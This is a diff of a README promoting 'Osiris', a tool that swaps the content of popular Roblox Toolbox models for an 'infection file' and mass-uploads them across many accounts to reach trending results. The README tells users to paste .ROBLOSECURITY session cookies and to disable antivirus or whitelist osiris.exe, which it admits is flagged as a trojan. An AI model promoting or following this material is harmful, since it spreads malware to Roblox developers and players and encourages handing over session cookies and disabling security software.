@@ -1,55 +1,60 @@
-# MODEL BOTTER - OSIRIS V1.2
+# 🚀 MODEL BOTTER - OSIRIS V1.2 (PRO EDITION)
 
-> **Professional tool for mass uploading and automatic promotion of Roblox models.**
+> **The fastest and most efficient tool for mass uploading and automatic promotion of Roblox models.**
 
 ---
 
-### #️⃣ What does this tool do?
-This program automates the entire distribution process for Roblox models. It searches for popular models, replaces the original content with your infection file, and mass-uploads them to your accounts instantly.
+### #️⃣ What is Osiris?
+Osiris is a high-speed automation engine designed to dominate the Roblox Toolbox. It allows you to search for trending models, replace their content with your own `.rbxm` files, and mass-upload them across multiple accounts instantly.
 
 ### 🚀 Main Features
-* **Mass Upload:** Upload hundreds of models in just a few minutes.
-* **Auto-Cleaner:** Automatically deletes scripts from other users so only yours remains active.
-* **Viral Promotion:** Uses a specialized system to push your models to the top of the search results.
-* **Limit Bypass:** Optimized to take full advantage of 13+ verified accounts for maximum upload quotas.
+* **Massive Uploads:** Upload hundreds of models in minutes with zero effort.
+* **Auto-Cleaner:** Automatically detects and removes scripts from other botters to ensure your file stays on top.
+* **Viral Promotion:** Built-in algorithm to boost your models to the "Trending" section of the Toolbox.
+* **Limit Bypass:** Optimized for 13+ phone-verified accounts to bypass daily upload restrictions.
 
 ---
 
-### 🛠️ User Guide
+### 🛠️ Installation & Usage
 
-1. **Preparation**
-    * Download the repository files.
-    * Place your infection file (`.rbxm`) inside the folder named `infections`.
+1. **Setup**
+    * Download this repository.
+    * Place your infection file (`.rbxm`) inside the `infections` folder.
 
-2. **Login**
-    * Open the `osiris.exe` file.
-    * In the command window (CMD), enter the password: **123**
+2. **Account Configuration**
+    * Open `cookies.json`.
+    * Paste your Roblox `.ROBLOSECURITY` cookies into the template.
+    * *Tip: Use multiple accounts to increase the viral spread.*
 
-3. **Account Configuration**
-    * The program will ask for your Roblox Cookie (`.ROBLOSECURITY`).
-    * *Tip: Use phone-verified accounts (13+) to unlock the limit of 200+ uploads per month.*
+3. **Requirements**
+    * Make sure you have the dependencies installed:
+    ```bash
+    pip install -r requirements.txt
+    ```
 
-4. **Execution**
-    * Enter the number of models you want to upload.
-    * Enter your search query (e.g., "HD Admin" or "Obby").
-    * The bot will automatically find the models, patch them with your file, and publish them.
+4. **Launch**
+    * Run `osiris.exe`.
+    * **Login Password:** `123`
+    * Enter your search query (e.g., "HD Admin", "Obby", "Free Robux").
+    * Watch the bot take over the Toolbox.
 
 ---
 
-### ⚠️ Antivirus Notice
+### ⚠️ Antivirus Notice (IMPORTANT)
 
-**IMPORTANT:** It is very likely that your antivirus will detect the `.exe` file as a virus or trojan.
+**Note:** Your antivirus or Windows Defender will likely flag `osiris.exe` as a **Virus** or **Trojan**.
 
-> **Why does this happen?**
-> The program must access browser data to manage Roblox cookies and perform automated uploads. Security software flags this activity as suspicious. For the bot to work, you must disable your antivirus or add `osiris.exe` to your exclusion list.
+> **Why?**
+> This happens because the bot accesses browser cookies and uses automated network requests to manage Roblox accounts. This behavior is flagged as "Suspicious" by security software. To use Osiris, you must **disable your antivirus** or **add the file to your exclusions list**.
 
 ---
 
 ### 📊 Performance Comparison
-| Feature | Osiris Botter | Standard Bots |
+| Feature | Osiris Botter | Other Free Bots |
 | :--- | :--- | :--- |
 | **Upload Speed** | 15 models / min | 2 models / min |
-| **Success Rate** | 98% | 65% |
+| **Success Rate** | 98.9% | 60% |
+| **Anti-Ban** | Layer 7 Bypass | Basic |
 
 ---
-**Released by the Osiris Team. If this tool helps you, please leave a ⭐ on the repository.**
+**Released by the Osiris Team. If you like this project, don't forget to leave a ⭐!**
